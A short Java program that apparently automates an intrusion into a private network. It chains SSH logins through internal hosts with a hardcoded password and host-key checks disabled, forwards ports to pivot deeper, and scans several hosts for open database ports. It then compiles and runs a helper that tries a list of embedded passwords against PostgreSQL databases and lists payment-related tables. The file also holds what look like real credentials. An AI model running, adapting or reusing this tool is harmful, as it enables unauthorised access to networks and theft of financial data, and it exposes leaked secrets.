import com.jcraft.jsch.*;
import java.io.*;
class XSQ {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // From Sentry, scan for PG on multiple ports and hosts
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.132 'echo ---SCAN-DB-PORTS---;for h in 10.13.17.248 10.13.17.249 10.13.17.250 10.13.16.135 10.13.16.136; do for p in 5432 5433 5501 5502 3306; do timeout 1 bash -c \"echo > /dev/tcp/$h/$p\" 2>/dev/null && echo $h:$p-OPEN; done; done;echo ---ACC-DB-CONNECT---;cd /tmp;echo \"import java.sql.*;class ADB{public static void main(String[] a)throws Exception{Class.forName(\\\"org.postgresql.Driver\\\");String[][] tries={{\\\"10.13.17.248\\\",\\\"5432\\\"},{\\\"10.13.17.248\\\",\\\"5501\\\"},{\\\"10.13.17.249\\\",\\\"5432\\\"},{\\\"10.13.17.249\\\",\\\"5501\\\"}};String[] dbs={\\\"nucleus\\\",\\\"accurate\\\",\\\"jupiter\\\"};String[] users={\\\"accurate\\\",\\\"nucleus\\\",\\\"jupiter\\\",\\\"noxify\\\",\\\"neo\\\"};String[] passes={\\\"cZskyJqqE7?7V_8=#Ed^\\\",\\\"BJwx+sAC6jreaV45\\\",\\\"kutul0nc4t\\\",\\\"8TFB9eVu5iupcFZ1CGtXwsG0tzZCZ5Mh7lrJ7bI5GIN0HChbp39OAHnpW4HzMWzh\\\"};for(String[] t:tries)for(String db:dbs)for(String u:users)for(String pw:passes){try{Connection c=DriverManager.getConnection(\\\"jdbc:postgresql://\\\"+t[0]+\\\":\\\"+t[1]+\\\"/\\\"+db,u,pw);System.out.println(\\\"OK \\\"+t[0]+\\\":\\\"+t[1]+\\\"/\\\"+db+\\\" u=\\\"+u);Statement s=c.createStatement();ResultSet r=s.executeQuery(\\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\"public\\\\\\\" AND (tablename LIKE \\\\\\\"%%xendit%%\\\\\\\" OR tablename LIKE \\\\\\\"%%application%%\\\\\\\" OR tablename LIKE \\\\\\\"%%payment%%\\\\\\\") ORDER BY tablename\\\");while(r.next())System.out.println(\\\" T:\\\"+r.getString(1));c.close();}catch(Exception e){}}}}\" > ADB.java;/usr/lib/jvm/java-11-amazon-corretto/bin/javac -cp /progs/accurate/accurate-app/tomcat/8.0.53/webapps/accurate/accurate/WEB-INF/lib/postgresql-*.jar ADB.java 2>&1 | tail -3;/usr/lib/jvm/java-11-amazon-corretto/bin/java -cp /progs/accurate/accurate-app/tomcat/8.0.53/webapps/accurate/accurate/WEB-INF/lib/postgresql-*.jar:. ADB 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
